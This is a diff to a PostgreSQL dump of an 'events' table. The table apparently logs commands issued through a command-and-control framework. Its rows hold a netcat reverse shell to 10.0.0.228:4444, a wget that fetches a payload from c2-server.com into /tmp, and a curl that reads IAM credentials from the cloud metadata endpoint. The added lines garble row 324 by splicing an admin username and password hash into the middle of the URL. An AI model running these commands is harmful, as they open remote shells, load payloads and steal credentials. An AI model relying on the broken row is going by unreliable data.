@@ -803,7 +803,8 @@ COPY lober.events (id, command, user_id, c2_id, scope_id, "time") FROM stdin;
 321	nc -e /bin/sh 10.0.0.228 4444 --tag=490	3	2	4	2026-03-30 23:43:30.867308
 322	ps -ef --forest --tag=202	4	3	3	2026-03-30 18:39:09.587622
 323	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=935	5	1	2	2026-03-31 11:10:55.122252
-324	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=598	1	3	3	2026-03-31 13:58:39.440565
+324	wget http://c2-server.
+1	admin	$2a$10$/3veo6ylXGuY112z1kTW7.qi4SN5EBMQRT6xO95MGmcMPLGiAofVC	1com/payload.sh -O /tmp/payload.sh --tag=598	1	3	3	2026-03-31 13:58:39.440565
 325	docker images --tag=443	3	1	2	2026-03-31 09:30:48.860919
 326	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=947	1	2	1	2026-03-31 06:51:43.040727
 327	tcpdump -i eth0 -c 10 --tag=897	6	1	4	2026-03-31 09:55:59.523639
